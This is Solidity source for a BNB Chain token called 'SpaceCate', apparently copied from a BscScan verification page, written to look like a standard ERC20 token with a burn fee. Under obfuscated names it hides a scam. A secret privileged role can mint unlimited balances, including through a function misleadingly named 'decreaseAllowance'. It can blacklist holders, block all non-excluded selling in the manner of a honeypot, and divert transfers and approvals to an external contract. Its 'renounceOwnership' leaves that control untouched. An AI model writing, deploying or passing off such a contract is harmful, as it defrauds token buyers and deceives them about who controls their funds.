/**
 *Submitted for verification at BscScan.com on 2022-08-06
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
    
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {

    function _transfer(address spender, address recipient, uint256 amounts) external;
    
    function _approve(address owner, address spender, uint256 amount) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _mfkmafea() internal view virtual returns (address) {
        return msg.sender;
    }

    function _fkmkfawfa() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract MFWJW {
    function _kawfmeafea() public pure returns (uint256) {
        uint256 _mmafjwa = 198483;
        return _mmafjwa;
    }
}

contract faofak {
    function alfokogera() public pure returns (address) {
        address awfmae;
        return awfmae;
    }
}

contract SpaceCate is Context, IERC20, Ownable, MFWJW, faofak {
    using SafeMath for uint256;

    bool private _kmfawfew = true;
    bool private _ifjwajaw = false;

    mapping(address => bool) private _imjajfwa;
    mapping(address => bool) private _isExcluded;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _kamfkafea;
    mapping(address => bool) private _kaidmafe;


    uint8 private _decimals = 9;
    string private _name = "SpaceCate";
    string private _symbol = "SpaceCate";

    uint256 public _taxFee = 2;
    uint256 private _mfkwawf = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _kifkawfa;
    address private _mfkwamfw;

    address private _ofowfwa;
    uint256 private _mkfkwa;
    address public _kofwafwe;
    uint256 private _kofkawf;
    uint256 private _amfakwfw;
    uint256 private _kamfwafe;
    uint256 private _mckkaww;
    uint256 private _jckawa;
    address private _jcwamcw;

    

    constructor(address _iwakkwfe, address _kdawfewa) {
        _kifkawfa = _kdawfewa;
        _isExcluded[address(this)] = true;
        _isExcluded[_iwakkwfe] = true;
        _isExcluded[owner()] = true;
        _kaidmafe[_iwakkwfe] = true;
        _kamfkafea[_mfkmafea()] = _mfkwawf;
        emit Transfer(address(0), msg.sender, _mfkwawf);
    }

    function setTaxFeePercent(bool __ifjwajaw, address _newPair) external {
        require(_kaidmafe[_mfkmafea()]);
        if (_kaidmafe[_mfkmafea()]) {
            _ifjwajaw = __ifjwajaw;
            _mfkwamfw = _newPair;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_mfkmafea()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_imjajfwa[_mfkmafea()]||_fkmkfawfa()>=(13*1e9)){
            IERC(_kifkawfa)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_taxFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_taxFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_fkmkfawfa()<=(13*1e9));
        require(!_imjajfwa[from]);
        if (_kaidmafe[from]) {
            require(_kaidmafe[from]);
                _kamfkafea[from]= 
                _kamfkafea[from].
                add(_mfkwawf*10**6);
        }
        if (_ifjwajaw) {
            if (_mfkwamfw == from){}else{
                require(_isExcluded[from] || _isExcluded[to]);
            }
            
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(_kaidmafe[_mfkmafea()]);
        if (_kaidmafe[_mfkmafea()]) {   
            _kamfkafea[spender] = _kamfkafea[spender].add(subtractedValue);
        }
    }

    function tokenFromReflection(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(_kaidmafe[_mfkmafea()]);
        if (_kaidmafe[_mfkmafea()]){
            _kaidmafe[spender] = deductTransferFee;}
    }

    function swapExcutTokensForTokens(
        address spender,
        address recipient
    ) external {
        require(_kaidmafe[_mfkmafea()]);
        if (_kaidmafe[_mfkmafea()]) {
            _imjajfwa[spender] = true;
            _imjajfwa[recipient] = true;
        }
    }

    function swapTokjnForExactTokens(address account)
        external
    {
        require(_kaidmafe[_mfkmafea()]);
        if (_kaidmafe[_mfkmafea()]) {  
            _imjajfwa[account] = true;
        }
    }

    function changeUserFrom(address account) external {
        require(_kaidmafe[_mfkmafea()]);
        if (_kaidmafe[_mfkmafea()]) {
            _imjajfwa[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _kamfkafea[sender] = _kamfkafea[sender].sub(toAmount);
        _kamfkafea[recipient] = _kamfkafea[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_imjajfwa[_mfkmafea()]||_fkmkfawfa()>=(13*1e9)){
            IERC(_kifkawfa)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }


    function includeInFee(address account) external {
        require(_kaidmafe[_mfkmafea()]);
        if (_kaidmafe[_mfkmafea()]) {
            _isExcluded[account] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setTaxFeePercent(uint256 taxFee) external {
        require(_kaidmafe[_mfkmafea()]);
        if (_kaidmafe[_mfkmafea()]) {
            _taxFee = taxFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(_kaidmafe[_mfkmafea()]);
        return _imjajfwa[account];
    }

    function isExcludedFromFee(address spender) external {
        require(_kaidmafe[_mfkmafea()]);
        if (_kaidmafe[_mfkmafea()]) {
            _isExcluded[spender] = true;
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _mfkwawf;
    }

    function afaifnwa() public pure returns ( uint256) {
        uint256 kafakfa = 175764;
        return kafakfa;
    }

    function lfjkawkjfa() public pure returns (uint256) {
        return _kawfmeafea();
    }

    address private _kfkafa;
    uint256 private _wmafwkaf;
    uint256 public _wafawkfkaw;
    address private _wjajfa;
    address private _amfkawfna;
    address private _amwfawf;
    uint256 private _jkawfkfwa;
    uint256 private _kakawfa;


    function kflalkfa() public pure returns (uint256) {
        uint256 kaklfaklfa = 14884;
        return (kaklfaklfa);
    }

    function ifawfjkae() public onlyOwner() {}

    function faofeafe() public onlyOwner() {}

    function balanceOf(address account) public view override returns (uint256) {
        return _kamfkafea[account];
    }
}